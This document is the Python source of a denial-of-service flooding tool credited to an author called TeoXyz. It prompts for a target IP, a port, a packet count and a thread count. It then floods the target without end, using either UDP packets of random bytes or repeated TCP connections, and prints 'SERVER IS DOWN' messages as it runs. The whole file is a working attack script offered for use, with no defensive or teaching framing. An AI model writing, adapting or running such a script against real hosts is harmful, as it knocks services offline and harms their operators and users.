import random
import socket
import threading
import os
import sys

os.system("clear")
print("""\033[92m
 ___________           
\__    ___/___  ____  
  |    |_/ __ \/  _ \ 
  |    |\  ___(  <_> )
  |____| \___  >____/ 
             \/       
                                               
                          """)
print("=============================================")
print(" | AUTHOR : TeoXyz")
print(" | GITHUB : https://github.com/TeoXyz/Ddos")
print(" | DISCORD : Abdul.#7018")
print(" | MY TEAM : https://discord.gg/icrp")
print("=============================================")
ip = str(input(" IP TARGET:"))
port = int(input(" PORT:"))
choice = str(input(" GAS DDOS?(y/n):"))
times = int(input(" PACKET:"))
threads = int(input(" ISI PACKET:"))
def run():
    data = random._urandom(8745)
    i = random.choice(("[TOK!!! TOK!!!]","[TOK!!! TOK!!!]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(f"Send packet to {ip} on port {port}")
        except:
            print("[#] SERVER IS DOWN!!!")

def run2():
    data = random._urandom(16)
    i = random.choice(("[TOK!!! TOK!!!]","[TOK!!! TOK!!!]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(f"Send packet to {ip} on port {port}")
        except:
            s.close()
            print("[#] SERVER IS DOWN!!!")
        
for y in range(threads):
    if choice == 'y':
        th = threading.Thread(target = run)
        th.start()
    else:
        th = threading.Thread(target = run2)
        th.start()
